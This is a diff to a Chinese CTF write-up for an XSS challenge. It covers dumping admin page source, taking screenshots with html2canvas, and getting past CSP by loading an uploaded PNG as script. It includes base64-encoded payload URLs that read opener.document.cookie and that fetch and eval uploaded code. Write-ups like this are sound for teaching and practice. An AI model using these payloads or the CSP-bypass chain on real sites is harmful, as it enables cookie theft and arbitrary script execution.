@@ -51,7 +51,101 @@ open可用，调到子页面直接打opener的资源就能避开父的属性调�
 http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&island=aa&fruit=aa"&name=url&data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F
 ```
 
-![](https://i.imgur.com/5JqaCIf.jpg)
+![-w442](https://i.loli.net/2020/05/08/q6T7nuFHUOYvip2.jpg)
+
+看到有一半flag肯定后面还有东西。打一下源码，看看hint里的admin行为是想表达个啥
+
+```
+<img src="/island/test_01.png" class="island-img">
+<img src="/island/test_02.png" class="island-img">
+<img src="/island/test_03.png" class="island-img">
+<img src="/island/test_04.png" class="island-img">
+<img src="/island/test_05.png" class="island-img">
+<img src="/island/test_06.png" class="island-img">
+<img src="/island/test_07.png" class="island-img">
+<img src="/island/test_08.png" class="island-img">
+<img src="/island/test_09.png" class="island-img">
+<img src="/island/test_10.png" class="island-img">
+<img src="/island/test_11.png" class="island-img">
+<img src="/island/test_12.png" class="island-img">
+<img src="/island/test_13.png" class="island-img">
+<img src="/island/test_14.png" class="island-img">
+<img src="/island/test_15.png" class="island-img">
+<img src="/island/test_16.png" class="island-img">
+<img src="/island/test_17.png" class="island-img">
+<img src="/island/test_18.png" class="island-img">
+<img src="/island/test_19.png" class="island-img">
+<img src="/island/test_20.png" class="island-img">
+<img src="/island/test_21.png" class="island-img">
+<img src="/island/test_22.png" class="island-img">
+<img src="/island/test_23.png" class="island-img">
+<img src="/island/test_24.png" class="island-img">
+<img src="/island/test_25.png" class="island-img">
+<img src="/island/test_26.png" class="island-img">
+<img src="/island/test_27.png" class="island-img">
+<img src="/island/test_28.png" class="island-img">
+<img src="/island/test_29.png" class="island-img">
+<img src="/island/test_30.png" class="island-img">
+<img src="/island/test_31.png" class="island-img">
+<img src="/island/test_32.png" class="island-img">
+<img src="/island/test_33.png" class="island-img">
+<img src="/island/test_34.png" class="island-img">
+<img src="/island/test_35.png" class="island-img">
+<img src="/island/test_36.png" class="island-img">
+<img src="/island/test_37.png" class="island-img">
+<img src="/island/test_38.png" class="island-img">
+<img src="/island/test_39.png" class="island-img">
+<img src="/island/test_40.png" class="island-img">
+<img src="/island/test_41.png" class="island-img">
+<img src="/island/test_42.png" class="island-img">
+<img src="/island/test_43.png" class="island-img">
+<img src="/island/test_44.png" class="island-img">
+<img src="/island/test_45.png" class="island-img">
+<img src="/island/test_46.png" class="island-img">
+<img src="/island/test_47.png" class="island-img">
+<img src="/island/test_48.png" class="island-img">
+<img src="/island/test_49.png" class="island-img">
+<img src="/island/test_50.png" class="island-img">
+<img src="/island/test_51.png" class="island-img">
+<img src="/island/test_52.png" class="island-img">
+<img src="/island/test_53.png" class="island-img">
+<img src="/island/test_54.png" class="island-img">
+<img src="/island/test_55.png" class="island-img">
+<img src="/island/test_56.png" class="island-img">
+<img src="/island/test_57.png" class="island-img">
+<img src="/island/test_58.png" class="island-img">
+<img src="/island/test_59.png" class="island-img">
+<img src="/island/test_60.png" class="island-img">
+<img src="/island/test_61.png" class="island-img">
+<img src="/island/test_62.png" class="island-img">
+<img src="/island/test_63.png" class="island-img">
+<img src="/island/test_64.png" class="island-img">
+<img src="/island/test_65.png" class="island-img">
+<img src="/island/test_66.png" class="island-img">
+<img src="/island/test_67.png" class="island-img">
+<img src"
+```
+
+看到这里，心想比赛结束了也就没继续了(工作量太大哭惹
+
+可以看到管理员页面加载了很多img，但是直接会访问500。
+
+很明显它这个意思就是想让我们拿到这些图片，我们得想办法找个能sreenshot的库，参考出题人的`html2canvas`：https://github.com/niklasvh/html2canvas，拉一个min出来就够用了
+
+本地测试一下min的截图功能没有被阉割，nice
+![-w1190](https://i.loli.net/2020/05/08/cYrIVQqNFBw4pRG.jpg)
+
+
+剩下就是过CSP，self不能直接script引入外源库文件。但可以把png作为js文件加载来用，default-src script-src指定self都可过。之前有个google-jsonp的csp bypass，思路类似都是把自己当作跳板了
+![-w1377](https://i.loli.net/2020/05/08/br9isOGjczD48TW.jpg)
+
+把截图内容作为图片再次上传到upload，回调出来的url发到http-log就能读到剩下的flag了。测试一下打本地ok，成功拿到upload的图片
+![-w1430](https://i.loli.net/2020/05/08/N1CPzpcLMbsj3Vy.jpg)
+
+```
+http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&island=aa&fruit=aa&name=url&data=amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzEzNC4xNzUuMjMxLjExMzo4ODQ4L3N0YXRpYy9pbWFnZXMvMDIwYTQ1NDJiZDU5MmQ3MWYwM2MyN2Q3ZjdkOWRlZmQucG5nJykudGhlbihyZXM9PnJlcy50ZXh0KCkpLnRoZW4odHh0PT5ldmFsKHR4dCkp%27%3b%0aopen(atob(data))%3b%2F%2F
+```
+
 
 ### mixture
 
